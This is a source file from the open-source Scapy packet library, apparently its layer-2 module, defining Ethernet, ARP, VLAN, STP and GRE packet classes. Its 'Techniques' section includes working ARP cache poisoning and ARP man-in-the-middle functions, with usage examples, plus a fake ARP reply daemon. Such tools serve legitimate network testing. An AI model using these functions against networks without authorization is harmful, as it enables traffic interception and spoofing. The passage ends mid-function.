# SPDX-License-Identifier: GPL-2.0-only
# This file is part of Scapy
# See https://scapy.net/ for more information
# Copyright (C) Philippe Biondi <phil@secdev.org>

"""
Classes and functions for layer 2 protocols.
"""

from __future__ import absolute_import
from __future__ import print_function
import struct
import time
import socket

from scapy.ansmachine import AnsweringMachine
from scapy.arch import get_if_addr, get_if_hwaddr
from scapy.base_classes import Gen, Net
from scapy.compat import chb, orb
from scapy.config import conf
from scapy import consts
from scapy.data import ARPHDR_ETHER, ARPHDR_LOOPBACK, ARPHDR_METRICOM, \
    DLT_ETHERNET_MPACKET, DLT_LINUX_IRDA, DLT_LINUX_SLL, DLT_LINUX_SLL2, \
    DLT_LOOP, DLT_NULL, ETHER_ANY, ETHER_BROADCAST, ETHER_TYPES, ETH_P_ARP, \
    ETH_P_MACSEC
from scapy.error import warning, ScapyNoDstMacException, log_runtime
from scapy.fields import (
    BCDFloatField,
    BitField,
    ByteEnumField,
    ByteField,
    ConditionalField,
    FCSField,
    FieldLenField,
    IP6Field,
    IPField,
    IntEnumField,
    IntField,
    LenField,
    MACField,
    MultipleTypeField,
    OUIField,
    ShortEnumField,
    ShortField,
    SourceIP6Field,
    SourceIPField,
    StrFixedLenField,
    StrLenField,
    XByteField,
    XIntField,
    XShortEnumField,
    XShortField,
)
from scapy.interfaces import _GlobInterfaceType
from scapy.libs.six import viewitems
from scapy.packet import bind_layers, Packet
from scapy.plist import (
    PacketList,
    QueryAnswer,
    SndRcvList,
    _PacketList,
)
from scapy.sendrecv import sendp, srp, srp1, srploop
from scapy.utils import checksum, hexdump, hexstr, inet_ntoa, inet_aton, \
    mac2str, valid_mac, valid_net, valid_net6
from scapy.compat import (
    Any,
    Callable,
    Dict,
    List,
    Optional,
    Tuple,
    Type,
    Union,
    cast,
)
from scapy.interfaces import NetworkInterface
if conf.route is None:
    # unused import, only to initialize conf.route
    import scapy.route  # noqa: F401


# type definitions
_ResolverCallable = Callable[[Packet, Packet], Optional[str]]

#################
#  Tools        #
#################


class Neighbor:
    def __init__(self):
        # type: () -> None
        self.resolvers = {}  # type: Dict[Tuple[Type[Packet], Type[Packet]], _ResolverCallable] # noqa: E501

    def register_l3(self, l2, l3, resolve_method):
        # type: (Type[Packet], Type[Packet], _ResolverCallable) -> None
        self.resolvers[l2, l3] = resolve_method

    def resolve(self, l2inst, l3inst):
        # type: (Ether, Packet) -> Optional[str]
        k = l2inst.__class__, l3inst.__class__
        if k in self.resolvers:
            return self.resolvers[k](l2inst, l3inst)
        return None

    def __repr__(self):
        # type: () -> str
        return "\n".join("%-15s -> %-15s" % (l2.__name__, l3.__name__) for l2, l3 in self.resolvers)  # noqa: E501


conf.neighbor = Neighbor()

# cache entries expire after 120s
_arp_cache = conf.netcache.new_cache("arp_cache", 120)


@conf.commands.register
def getmacbyip(ip, chainCC=0):
    # type: (str, int) -> Optional[str]
    """Return MAC address corresponding to a given IP address"""
    if isinstance(ip, Net):
        ip = next(iter(ip))
    ip = inet_ntoa(inet_aton(ip or "0.0.0.0"))
    tmp = [orb(e) for e in inet_aton(ip)]
    if (tmp[0] & 0xf0) == 0xe0:  # mcast @
        return "01:00:5e:%.2x:%.2x:%.2x" % (tmp[1] & 0x7f, tmp[2], tmp[3])
    iff, _, gw = conf.route.route(ip)
    if (iff == conf.loopback_name) or (ip in conf.route.get_if_bcast(iff)):
        return "ff:ff:ff:ff:ff:ff"
    if gw != "0.0.0.0":
        ip = gw

    mac = _arp_cache.get(ip)
    if mac:
        return mac

    try:
        res = srp1(Ether(dst=ETHER_BROADCAST) / ARP(op="who-has", pdst=ip),
                   type=ETH_P_ARP,
                   iface=iff,
                   timeout=2,
                   verbose=0,
                   chainCC=chainCC,
                   nofilter=1)
    except Exception as ex:
        warning("getmacbyip failed on %s", ex)
        return None
    if res is not None:
        mac = res.payload.hwsrc
        _arp_cache[ip] = mac
        return mac
    return None


# Fields

class DestMACField(MACField):
    def __init__(self, name):
        # type: (str) -> None
        MACField.__init__(self, name, None)

    def i2h(self, pkt, x):
        # type: (Optional[Ether], Optional[str]) -> str
        if x is None and pkt is not None:
            try:
                x = conf.neighbor.resolve(pkt, pkt.payload)
            except socket.error:
                pass
            if x is None:
                if conf.raise_no_dst_mac:
                    raise ScapyNoDstMacException()
                else:
                    x = "ff:ff:ff:ff:ff:ff"
                    warning("Mac address to reach destination not found. Using broadcast.")  # noqa: E501
        return super(DestMACField, self).i2h(pkt, x)

    def i2m(self, pkt, x):
        # type: (Optional[Ether], Optional[str]) -> bytes
        return MACField.i2m(self, pkt, self.i2h(pkt, x))


class SourceMACField(MACField):
    __slots__ = ["getif"]

    def __init__(self, name, getif=None):
        # type: (str, Optional[Any]) -> None
        MACField.__init__(self, name, None)
        self.getif = (lambda pkt: pkt.route()[0]) if getif is None else getif

    def i2h(self, pkt, x):
        # type: (Optional[Packet], Optional[str]) -> str
        if x is None:
            iff = self.getif(pkt)
            if iff is None:
                iff = conf.iface
            if iff:
                try:
                    x = get_if_hwaddr(iff)
                except Exception as e:
                    warning("Could not get the source MAC: %s" % e)
            if x is None:
                x = "00:00:00:00:00:00"
        return super(SourceMACField, self).i2h(pkt, x)

    def i2m(self, pkt, x):
        # type: (Optional[Ether], Optional[Any]) -> bytes
        return MACField.i2m(self, pkt, self.i2h(pkt, x))


# Layers

HARDWARE_TYPES = {
    1: "Ethernet (10Mb)",
    2: "Ethernet (3Mb)",
    3: "AX.25",
    4: "Proteon ProNET Token Ring",
    5: "Chaos",
    6: "IEEE 802 Networks",
    7: "ARCNET",
    8: "Hyperchannel",
    9: "Lanstar",
    10: "Autonet Short Address",
    11: "LocalTalk",
    12: "LocalNet",
    13: "Ultra link",
    14: "SMDS",
    15: "Frame relay",
    16: "ATM",
    17: "HDLC",
    18: "Fibre Channel",
    19: "ATM",
    20: "Serial Line",
    21: "ATM",
}

ETHER_TYPES[0x88a8] = '802_AD'
ETHER_TYPES[ETH_P_MACSEC] = '802_1AE'


class Ether(Packet):
    name = "Ethernet"
    fields_desc = [DestMACField("dst"),
                   SourceMACField("src"),
                   XShortEnumField("type", 0x9000, ETHER_TYPES)]
    __slots__ = ["_defrag_pos"]

    def hashret(self):
        # type: () -> bytes
        return struct.pack("H", self.type) + self.payload.hashret()

    def answers(self, other):
        # type: (Packet) -> int
        if isinstance(other, Ether):
            if self.type == other.type:
                return self.payload.answers(other.payload)
        return 0

    def mysummary(self):
        # type: () -> str
        return self.sprintf("%src% > %dst% (%type%)")

    @classmethod
    def dispatch_hook(cls, _pkt=None, *args, **kargs):
        # type: (Optional[bytes], *Any, **Any) -> Type[Packet]
        if _pkt and len(_pkt) >= 14:
            if struct.unpack("!H", _pkt[12:14])[0] <= 1500:
                return Dot3
        return cls


class Dot3(Packet):
    name = "802.3"
    fields_desc = [DestMACField("dst"),
                   SourceMACField("src"),
                   LenField("len", None, "H")]

    def extract_padding(self, s):
        # type: (bytes) -> Tuple[bytes, bytes]
        tmp_len = self.len
        return s[:tmp_len], s[tmp_len:]

    def answers(self, other):
        # type: (Ether) -> int
        if isinstance(other, Dot3):
            return self.payload.answers(other.payload)
        return 0

    def mysummary(self):
        # type: () -> str
        return "802.3 %s > %s" % (self.src, self.dst)

    @classmethod
    def dispatch_hook(cls, _pkt=None, *args, **kargs):
        # type: (Optional[Any], *Any, **Any) -> Type[Packet]
        if _pkt and len(_pkt) >= 14:
            if struct.unpack("!H", _pkt[12:14])[0] > 1500:
                return Ether
        return cls


class LLC(Packet):
    name = "LLC"
    fields_desc = [XByteField("dsap", 0x00),
                   XByteField("ssap", 0x00),
                   ByteField("ctrl", 0)]


def l2_register_l3(l2, l3):
    # type: (Packet, Packet) -> Optional[str]
    neighbor = conf.neighbor  # type: Neighbor
    return neighbor.resolve(l2, l3.payload)


conf.neighbor.register_l3(Ether, LLC, l2_register_l3)
conf.neighbor.register_l3(Dot3, LLC, l2_register_l3)


COOKED_LINUX_PACKET_TYPES = {
    0: "unicast",
    1: "broadcast",
    2: "multicast",
    3: "unicast-to-another-host",
    4: "sent-by-us"
}


class CookedLinux(Packet):
    # Documentation: http://www.tcpdump.org/linktypes/LINKTYPE_LINUX_SLL.html
    name = "cooked linux"
    # from wireshark's database
    fields_desc = [ShortEnumField("pkttype", 0, COOKED_LINUX_PACKET_TYPES),
                   XShortField("lladdrtype", 512),
                   ShortField("lladdrlen", 0),
                   StrFixedLenField("src", b"", 8),
                   XShortEnumField("proto", 0x800, ETHER_TYPES)]


class CookedLinuxV2(CookedLinux):
    # Documentation: https://www.tcpdump.org/linktypes/LINKTYPE_LINUX_SLL2.html
    name = "cooked linux v2"
    fields_desc = [XShortEnumField("proto", 0x800, ETHER_TYPES),
                   ShortField("reserved", 0),
                   IntField("ifindex", 0),
                   XShortField("lladdrtype", 512),
                   ByteEnumField("pkttype", 0, COOKED_LINUX_PACKET_TYPES),
                   ByteField("lladdrlen", 0),
                   StrFixedLenField("src", b"", 8)]


class MPacketPreamble(Packet):
    # IEEE 802.3br Figure 99-3
    name = "MPacket Preamble"
    fields_desc = [StrFixedLenField("preamble", b"", length=8),
                   FCSField("fcs", 0, fmt="!I")]


class SNAP(Packet):
    name = "SNAP"
    fields_desc = [OUIField("OUI", 0x000000),
                   XShortEnumField("code", 0x000, ETHER_TYPES)]


conf.neighbor.register_l3(Dot3, SNAP, l2_register_l3)


class Dot1Q(Packet):
    name = "802.1Q"
    aliastypes = [Ether]
    fields_desc = [BitField("prio", 0, 3),
                   BitField("id", 0, 1),
                   BitField("vlan", 1, 12),
                   XShortEnumField("type", 0x0000, ETHER_TYPES)]

    def answers(self, other):
        # type: (Packet) -> int
        if isinstance(other, Dot1Q):
            if ((self.type == other.type) and
                    (self.vlan == other.vlan)):
                return self.payload.answers(other.payload)
        else:
            return self.payload.answers(other)
        return 0

    def default_payload_class(self, pay):
        # type: (bytes) -> Type[Packet]
        if self.type <= 1500:
            return LLC
        return conf.raw_layer

    def extract_padding(self, s):
        # type: (bytes) -> Tuple[bytes, Optional[bytes]]
        if self.type <= 1500:
            return s[:self.type], s[self.type:]
        return s, None

    def mysummary(self):
        # type: () -> str
        if isinstance(self.underlayer, Ether):
            return self.underlayer.sprintf("802.1q %Ether.src% > %Ether.dst% (%Dot1Q.type%) vlan %Dot1Q.vlan%")  # noqa: E501
        else:
            return self.sprintf("802.1q (%Dot1Q.type%) vlan %Dot1Q.vlan%")


conf.neighbor.register_l3(Ether, Dot1Q, l2_register_l3)


class STP(Packet):
    name = "Spanning Tree Protocol"
    fields_desc = [ShortField("proto", 0),
                   ByteField("version", 0),
                   ByteField("bpdutype", 0),
                   ByteField("bpduflags", 0),
                   ShortField("rootid", 0),
                   MACField("rootmac", ETHER_ANY),
                   IntField("pathcost", 0),
                   ShortField("bridgeid", 0),
                   MACField("bridgemac", ETHER_ANY),
                   ShortField("portid", 0),
                   BCDFloatField("age", 1),
                   BCDFloatField("maxage", 20),
                   BCDFloatField("hellotime", 2),
                   BCDFloatField("fwddelay", 15)]


class ARP(Packet):
    name = "ARP"
    fields_desc = [
        XShortEnumField("hwtype", 0x0001, HARDWARE_TYPES),
        XShortEnumField("ptype", 0x0800, ETHER_TYPES),
        FieldLenField("hwlen", None, fmt="B", length_of="hwsrc"),
        FieldLenField("plen", None, fmt="B", length_of="psrc"),
        ShortEnumField("op", 1, {
            "who-has": 1,
            "is-at": 2,
            "RARP-req": 3,
            "RARP-rep": 4,
            "Dyn-RARP-req": 5,
            "Dyn-RAR-rep": 6,
            "Dyn-RARP-err": 7,
            "InARP-req": 8,
            "InARP-rep": 9
        }),
        MultipleTypeField(
            [
                (SourceMACField("hwsrc"),
                 (lambda pkt: pkt.hwtype == 1 and pkt.hwlen == 6,
                  lambda pkt, val: pkt.hwtype == 1 and (
                      pkt.hwlen == 6 or (pkt.hwlen is None and
                                         (val is None or len(val) == 6 or
                                          valid_mac(val)))
                  ))),
            ],
            StrFixedLenField("hwsrc", None, length_from=lambda pkt: pkt.hwlen),
        ),
        MultipleTypeField(
            [
                (SourceIPField("psrc", "pdst"),
                 (lambda pkt: pkt.ptype == 0x0800 and pkt.plen == 4,
                  lambda pkt, val: pkt.ptype == 0x0800 and (
                      pkt.plen == 4 or (pkt.plen is None and
                                        (val is None or valid_net(val)))
                  ))),
                (SourceIP6Field("psrc", "pdst"),
                 (lambda pkt: pkt.ptype == 0x86dd and pkt.plen == 16,
                  lambda pkt, val: pkt.ptype == 0x86dd and (
                      pkt.plen == 16 or (pkt.plen is None and
                                         (val is None or valid_net6(val)))
                  ))),
            ],
            StrFixedLenField("psrc", None, length_from=lambda pkt: pkt.plen),
        ),
        MultipleTypeField(
            [
                (MACField("hwdst", ETHER_ANY),
                 (lambda pkt: pkt.hwtype == 1 and pkt.hwlen == 6,
                  lambda pkt, val: pkt.hwtype == 1 and (
                      pkt.hwlen == 6 or (pkt.hwlen is None and
                                         (val is None or len(val) == 6 or
                                          valid_mac(val)))
                  ))),
            ],
            StrFixedLenField("hwdst", None, length_from=lambda pkt: pkt.hwlen),
        ),
        MultipleTypeField(
            [
                (IPField("pdst", "0.0.0.0"),
                 (lambda pkt: pkt.ptype == 0x0800 and pkt.plen == 4,
                  lambda pkt, val: pkt.ptype == 0x0800 and (
                      pkt.plen == 4 or (pkt.plen is None and
                                        (val is None or valid_net(val)))
                  ))),
                (IP6Field("pdst", "::"),
                 (lambda pkt: pkt.ptype == 0x86dd and pkt.plen == 16,
                  lambda pkt, val: pkt.ptype == 0x86dd and (
                      pkt.plen == 16 or (pkt.plen is None and
                                         (val is None or valid_net6(val)))
                  ))),
            ],
            StrFixedLenField("pdst", None, length_from=lambda pkt: pkt.plen),
        ),
    ]

    def hashret(self):
        # type: () -> bytes
        return struct.pack(">HHH", self.hwtype, self.ptype,
                           ((self.op + 1) // 2)) + self.payload.hashret()

    def answers(self, other):
        # type: (Packet) -> int
        if not isinstance(other, ARP):
            return False
        if self.op != other.op + 1:
            return False
        # We use a loose comparison on psrc vs pdst to catch answers
        # with ARP leaks
        self_psrc = self.get_field('psrc').i2m(self, self.psrc)  # type: bytes
        other_pdst = other.get_field('pdst').i2m(other, other.pdst) \
            # type: bytes
        return self_psrc[:len(other_pdst)] == other_pdst[:len(self_psrc)]

    def route(self):
        # type: () -> Tuple[Optional[str], Optional[str], Optional[str]]
        fld, dst = cast(Tuple[MultipleTypeField, str],
                        self.getfield_and_val("pdst"))
        fld_inner, dst = fld._find_fld_pkt_val(self, dst)
        if isinstance(dst, Gen):
            dst = next(iter(dst))
        if isinstance(fld_inner, IP6Field):
            return conf.route6.route(dst)
        elif isinstance(fld_inner, IPField):
            return conf.route.route(dst)
        else:
            return None, None, None

    def extract_padding(self, s):
        # type: (bytes) -> Tuple[bytes, bytes]
        return b"", s

    def mysummary(self):
        # type: () -> str
        if self.op == 1:
            return self.sprintf("ARP who has %pdst% says %psrc%")
        if self.op == 2:
            return self.sprintf("ARP is at %hwsrc% says %psrc%")
        return self.sprintf("ARP %op% %psrc% > %pdst%")


def l2_register_l3_arp(l2, l3):
    # type: (Packet, Packet) -> Optional[str]
    # TODO: support IPv6?
    plen = l3.plen if l3.plen is not None else l3.get_field("pdst").i2len(l3, l3.pdst)
    if plen == 4:
        return getmacbyip(l3.pdst)
    log_runtime.warning(
        "Unable to guess L2 MAC address from an ARP packet with a "
        "non-IPv4 pdst. Provide it manually !"
    )
    return None


conf.neighbor.register_l3(Ether, ARP, l2_register_l3_arp)


class GRErouting(Packet):
    name = "GRE routing information"
    fields_desc = [ShortField("address_family", 0),
                   ByteField("SRE_offset", 0),
                   FieldLenField("SRE_len", None, "routing_info", "B"),
                   StrLenField("routing_info", b"",
                               length_from=lambda pkt: pkt.SRE_len),
                   ]


class GRE(Packet):
    name = "GRE"
    deprecated_fields = {
        "seqence_number": ("sequence_number", "2.4.4"),
    }
    fields_desc = [BitField("chksum_present", 0, 1),
                   BitField("routing_present", 0, 1),
                   BitField("key_present", 0, 1),
                   BitField("seqnum_present", 0, 1),
                   BitField("strict_route_source", 0, 1),
                   BitField("recursion_control", 0, 3),
                   BitField("flags", 0, 5),
                   BitField("version", 0, 3),
                   XShortEnumField("proto", 0x0000, ETHER_TYPES),
                   ConditionalField(XShortField("chksum", None), lambda pkt:pkt.chksum_present == 1 or pkt.routing_present == 1),  # noqa: E501
                   ConditionalField(XShortField("offset", None), lambda pkt:pkt.chksum_present == 1 or pkt.routing_present == 1),  # noqa: E501
                   ConditionalField(XIntField("key", None), lambda pkt:pkt.key_present == 1),  # noqa: E501
                   ConditionalField(XIntField("sequence_number", None), lambda pkt:pkt.seqnum_present == 1),  # noqa: E501
                   ]

    @classmethod
    def dispatch_hook(cls, _pkt=None, *args, **kargs):
        # type: (Optional[Any], *Any, **Any) -> Type[Packet]
        if _pkt and struct.unpack("!H", _pkt[2:4])[0] == 0x880b:
            return GRE_PPTP
        return cls

    def post_build(self, p, pay):
        # type: (bytes, bytes) -> bytes
        p += pay
        if self.chksum_present and self.chksum is None:
            c = checksum(p)
            p = p[:4] + chb((c >> 8) & 0xff) + chb(c & 0xff) + p[6:]
        return p


class GRE_PPTP(GRE):

    """
    Enhanced GRE header used with PPTP
    RFC 2637
    """

    name = "GRE PPTP"
    deprecated_fields = {
        "seqence_number": ("sequence_number", "2.4.4"),
    }
    fields_desc = [BitField("chksum_present", 0, 1),
                   BitField("routing_present", 0, 1),
                   BitField("key_present", 1, 1),
                   BitField("seqnum_present", 0, 1),
                   BitField("strict_route_source", 0, 1),
                   BitField("recursion_control", 0, 3),
                   BitField("acknum_present", 0, 1),
                   BitField("flags", 0, 4),
                   BitField("version", 1, 3),
                   XShortEnumField("proto", 0x880b, ETHER_TYPES),
                   ShortField("payload_len", None),
                   ShortField("call_id", None),
                   ConditionalField(XIntField("sequence_number", None), lambda pkt: pkt.seqnum_present == 1),  # noqa: E501
                   ConditionalField(XIntField("ack_number", None), lambda pkt: pkt.acknum_present == 1)]  # noqa: E501

    def post_build(self, p, pay):
        # type: (bytes, bytes) -> bytes
        p += pay
        if self.payload_len is None:
            pay_len = len(pay)
            p = p[:4] + chb((pay_len >> 8) & 0xff) + chb(pay_len & 0xff) + p[6:]  # noqa: E501
        return p


# *BSD loopback layer

class LoIntEnumField(IntEnumField):

    def m2i(self, pkt, x):
        # type: (Optional[Packet], int) -> int
        return x >> 24

    def i2m(self, pkt, x):
        # type: (Optional[Packet], Union[List[int], int, None]) -> int
        return cast(int, x) << 24


# https://github.com/wireshark/wireshark/blob/fe219637a6748130266a0b0278166046e60a2d68/epan/dissectors/packet-null.c
# https://www.wireshark.org/docs/wsar_html/epan/aftypes_8h.html
LOOPBACK_TYPES = {0x2: "IPv4",
                  0x7: "OSI",
                  0x10: "Appletalk",
                  0x17: "Netware IPX/SPX",
                  0x18: "IPv6", 0x1c: "IPv6", 0x1e: "IPv6"}


class Loopback(Packet):
    r"""\*BSD loopback layer"""

    name = "Loopback"
    if consts.OPENBSD:
        fields_desc = [IntEnumField("type", 0x2, LOOPBACK_TYPES)]
    else:
        fields_desc = [LoIntEnumField("type", 0x2, LOOPBACK_TYPES)]
    __slots__ = ["_defrag_pos"]


class Dot1AD(Dot1Q):
    name = '802_1AD'


bind_layers(Dot3, LLC)
bind_layers(Ether, LLC, type=122)
bind_layers(Ether, LLC, type=34928)
bind_layers(Ether, Dot1Q, type=33024)
bind_layers(Ether, Dot1AD, type=0x88a8)
bind_layers(Dot1AD, Dot1AD, type=0x88a8)
bind_layers(Dot1AD, Dot1Q, type=0x8100)
bind_layers(Dot1Q, Dot1AD, type=0x88a8)
bind_layers(Ether, Ether, type=1)
bind_layers(Ether, ARP, type=2054)
bind_layers(CookedLinux, LLC, proto=122)
bind_layers(CookedLinux, Dot1Q, proto=33024)
bind_layers(CookedLinux, Dot1AD, type=0x88a8)
bind_layers(CookedLinux, Ether, proto=1)
bind_layers(CookedLinux, ARP, proto=2054)
bind_layers(MPacketPreamble, Ether)
bind_layers(GRE, LLC, proto=122)
bind_layers(GRE, Dot1Q, proto=33024)
bind_layers(GRE, Dot1AD, type=0x88a8)
bind_layers(GRE, Ether, proto=0x6558)
bind_layers(GRE, ARP, proto=2054)
bind_layers(GRE, GRErouting, {"routing_present": 1})
bind_layers(GRErouting, conf.raw_layer, {"address_family": 0, "SRE_len": 0})
bind_layers(GRErouting, GRErouting)
bind_layers(LLC, STP, dsap=66, ssap=66, ctrl=3)
bind_layers(LLC, SNAP, dsap=170, ssap=170, ctrl=3)
bind_layers(SNAP, Dot1Q, code=33024)
bind_layers(SNAP, Dot1AD, type=0x88a8)
bind_layers(SNAP, Ether, code=1)
bind_layers(SNAP, ARP, code=2054)
bind_layers(SNAP, STP, code=267)

conf.l2types.register(ARPHDR_ETHER, Ether)
conf.l2types.register_num2layer(ARPHDR_METRICOM, Ether)
conf.l2types.register_num2layer(ARPHDR_LOOPBACK, Ether)
conf.l2types.register_layer2num(ARPHDR_ETHER, Dot3)
conf.l2types.register(DLT_LINUX_SLL, CookedLinux)
conf.l2types.register(DLT_LINUX_SLL2, CookedLinuxV2)
conf.l2types.register(DLT_ETHERNET_MPACKET, MPacketPreamble)
conf.l2types.register_num2layer(DLT_LINUX_IRDA, CookedLinux)
conf.l2types.register(DLT_LOOP, Loopback)
conf.l2types.register_num2layer(DLT_NULL, Loopback)

conf.l3types.register(ETH_P_ARP, ARP)


# Techniques


@conf.commands.register
def arpcachepoison(
    target,  # type: Union[str, List[str]]
    addresses,  # type: Union[str, Tuple[str, str], List[Tuple[str, str]]]
    interval=15,  # type: int
):
    # type: (...) -> None
    """Poison targets' ARP cache

    :param target: Can be an IP, subnet (string) or a list of IPs. This lists the IPs
                   or subnets that will be poisoned.
    :param addresses: Can be either a string, a tuple of a list of tuples.
                      If it's a string, it's the IP to usurpate in the victim,
                      with the local interface's MAC. If it's a tuple,
                      it's ("IP", "MAC"). It it's a list, it's [("IP", "MAC")]

    Examples for target "192.168.0.2"::

        >>> arpcachepoison("192.168.0.2", "192.168.0.1")
        >>> arpcachepoison("192.168.0.1/24", "192.168.0.1")
        >>> arpcachepoison(["192.168.0.2", "192.168.0.3"], "192.168.0.1")
        >>> arpcachepoison("192.168.0.2", ("192.168.0.1", get_if_hwaddr("virbr0")))
        >>> arpcachepoison("192.168.0.2", [("192.168.0.1", get_if_hwaddr("virbr0"),
        ...                                ("192.168.0.2", "aa:aa:aa:aa:aa:aa")])

    """
    if isinstance(target, str):
        targets = Net(target)  # type: Union[Net, List[str]]
        str_target = target
    else:
        targets = target
        str_target = target[0]
    if isinstance(addresses, str):
        couple_list = [(addresses, get_if_hwaddr(conf.route.route(str_target)[0]))]
    elif isinstance(addresses, tuple):
        couple_list = [addresses]
    else:
        couple_list = addresses
    p = [
        Ether(src=y) / ARP(op="who-has", psrc=x, pdst=targets,
                           hwsrc=y, hwdst="ff:ff:ff:ff:ff:ff")
        for x, y in couple_list
    ]
    try:
        while True:
            sendp(p, iface_hint=str_target)
            time.sleep(interval)
    except KeyboardInterrupt:
        pass


@conf.commands.register
def arp_mitm(
    ip1,  # type: str
    ip2,  # type: str
    mac1=None,  # type: Optional[str]
    mac2=None,  # type: Optional[str]
    target_mac=None,  # type: Optional[str]
    iface=None,  # type: Optional[_GlobInterfaceType]
    inter=3,  # type: int
):
    # type: (...) -> None
    """ARP MitM: poison 2 target's ARP cache

    :param ip1: IPv4 of the first machine
    :param ip2: IPv4 of the second machine
    :param mac1: MAC of the first machine (optional: will ARP otherwise)
    :param mac2: MAC of the second machine (optional: will ARP otherwise)
    :param target_mac: MAC of the attacker (optional: default to the interface's one)
    :param iface: the network interface. (optional: default, route for ip1)

    Example usage::

        $ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface
        $ sysctl net.ipv4.ip_forward=1
        $ sudo scapy
        >>> arp_mitm("192.168.122.156", "192.168.122.17")

    Remember to change the sysctl settings back..
    """
    if not iface:
        iface = conf.route.route(ip1)[0]
    if not target_mac:
        target_mac = get_if_hwaddr(iface)
    if mac1 is None:
        mac1 = getmacbyip(ip1)
        if not mac1:
            print("Can't resolve mac for %s" % ip1)
            return
    if mac2 is None:
        mac2 = getmacbyip(ip2)
        if not mac2:
            print("Can't resolve mac for %s" % ip2)
            return
    print("MITM on %s: %s <--> %s <--> %s" % (iface, mac1, target_mac, mac2))
    # We loop who-has requests
    srploop(
        [
            Ether(dst=mac1, src=target_mac) /
            ARP(op="who-has", psrc=ip2, pdst=ip1,
                hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff"),
            Ether(dst=mac2, src=target_mac) /
            ARP(op="who-has", psrc=ip1, pdst=ip2,
                hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff")
        ],
        filter="arp and arp[7] = 2",
        inter=inter,
        iface=iface,
        timeout=0.5,
        verbose=1,
        store=0,
    )
    print("Restoring...")
    sendp([
        Ether(dst=mac1, src=target_mac) /
        ARP(op="who-has", psrc=ip2, pdst=ip1,
            hwsrc=mac2, hwdst="ff:ff:ff:ff:ff:ff"),
        Ether(dst=mac2, src=target_mac) /
        ARP(op="who-has", psrc=ip1, pdst=ip2,
            hwsrc=mac1, hwdst="ff:ff:ff:ff:ff:ff")
    ], iface=iface)


class ARPingResult(SndRcvList):
    def __init__(self,
                 res=None,  # type: Optional[Union[_PacketList[QueryAnswer], List[QueryAnswer]]]  # noqa: E501
                 name="ARPing",  # type: str
                 stats=None  # type: Optional[List[Type[Packet]]]
                 ):
        SndRcvList.__init__(self, res, name, stats)

    def show(self, *args, **kwargs):
        # type: (*Any, **Any) -> None
        """
        Print the list of discovered MAC addresses.
        """

        data = list()
        padding = 0

        for s, r in self.res:
            manuf = conf.manufdb._get_short_manuf(r.src)
            manuf = "unknown" if manuf == r.src else manuf
            padding = max(padding, len(manuf))
            data.append((r[Ether].src, manuf, r[ARP].psrc))

        for src, manuf, psrc in data:
            print("  %-17s %-*s %s" % (src, padding, manuf, psrc))


@conf.commands.register
def arping(net, timeout=2, cache=0, verbose=None, **kargs):
    # type: (str, int, int, Optional[int], **Any) -> Tuple[ARPingResult, PacketList] # noqa: E501
    """Send ARP who-has requests to determine which hosts are up
arping(net, [cache=0,] [iface=conf.iface,] [verbose=conf.verb]) -> None
Set cache=True if you want arping to modify internal ARP-Cache"""
    if verbose is None:
        verbose = conf.verb
    ans, unans = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net),
        verbose=verbose,
        filter="arp and arp[7] = 2",
        timeout=timeout,
        iface_hint=net,
        **kargs
    )
    ans = ARPingResult(ans.res)

    if cache and ans is not None:
        for pair in ans:
            _arp_cache[pair[1].psrc] = pair[1].hwsrc
    if ans is not None and verbose:
        ans.show()
    return ans, unans


@conf.commands.register
def is_promisc(ip, fake_bcast="ff:ff:00:00:00:00", **kargs):
    # type: (str, str, **Any) -> bool
    """Try to guess if target is in Promisc mode. The target is provided by its ip."""  # noqa: E501

    responses = srp1(Ether(dst=fake_bcast) / ARP(op="who-has", pdst=ip), type=ETH_P_ARP, iface_hint=ip, timeout=1, verbose=0, **kargs)  # noqa: E501

    return responses is not None


@conf.commands.register
def promiscping(net, timeout=2, fake_bcast="ff:ff:ff:ff:ff:fe", **kargs):
    # type: (str, int, str, **Any) -> Tuple[ARPingResult, PacketList]
    """Send ARP who-has requests to determine which hosts are in promiscuous mode
    promiscping(net, iface=conf.iface)"""
    ans, unans = srp(Ether(dst=fake_bcast) / ARP(pdst=net),
                     filter="arp and arp[7] = 2", timeout=timeout, iface_hint=net, **kargs)  # noqa: E501
    ans = ARPingResult(ans.res, name="PROMISCPing")

    ans.display()
    return ans, unans


class ARP_am(AnsweringMachine[Packet]):
    """Fake ARP Relay Daemon (farpd)

    example:
    To respond to an ARP request for 192.168.100 replying on the
    ingress interface::

      farpd(IP_addr='192.168.1.100',ARP_addr='00:01:02:03:04:05')

    To respond on a different interface add the interface parameter::

      farpd(IP_addr='192.168.1.100',ARP_addr='00:01:02:03:04:05',iface='eth0')

    To respond on ANY arp request on an interface with mac address ARP_addr::

      farpd(ARP_addr='00:01:02:03:04:05',iface='eth1')

    To respond on ANY arp request with my mac addr on the given interface::

      farpd(iface='eth1')

    Optional Args::

     inter=<n>   Interval in seconds between ARP replies being sent

    """

    function_name = "farpd"
    filter = "arp"
    send_function = staticmethod(sendp)

    def parse_options(self, IP_addr=None, ARP_addr=None, from_ip=None):
        # type: (Optional[str], Optional[str], Optional[str]) -> None
        if isinstance(IP_addr, str):
            self.IP_addr = Net(IP_addr)  # type: Optional[Net]
        else:
            self.IP_addr = IP_addr
        if isinstance(from_ip, str):
            self.from_ip = Net(from_ip)  # type: Optional[Net]
        else:
            self.from_ip = from_ip
        self.ARP_addr = ARP_addr

    def is_request(self, req):
        # type: (Ether) -> bool
        if not req.haslayer(ARP):
            return False
        arp = req[ARP]
        return (
            arp.op == 1 and
            (self.IP_addr is None or arp.pdst in self.IP_addr) and
            (self.from_ip is None or arp.psrc in self.from_ip)
        )

    def make_reply(self, req):
        # type: (Packet) -> Packet
        ether = req[Ether]
        arp = req[ARP]

        if 'iface' in self.optsend:
            iff = cast(Union[NetworkInterface, str], self.optsend.get('iface'))
        else:
            iff, a, gw = conf.route.route(arp.psrc)
        self.iff = iff
        if self.ARP_addr is None:
            try:
                ARP_addr = get_if_hwaddr(iff)
            except Exception:
                ARP_addr = "00:00:00:00:00:00"
        else:
            ARP_addr = self.ARP_addr
        resp = Ether(dst=ether.src,
                     src=ARP_addr) / ARP(op="is-at",
                                         hwsrc=ARP_addr,
                                         psrc=arp.pdst,
                                         hwdst=arp.hwsrc,
                                         pdst=arp.psrc)
        return resp

    def send_reply(self, reply, send_function=None):
        # type: (Packet, Any) -> None
        if 'iface' in self.optsend:
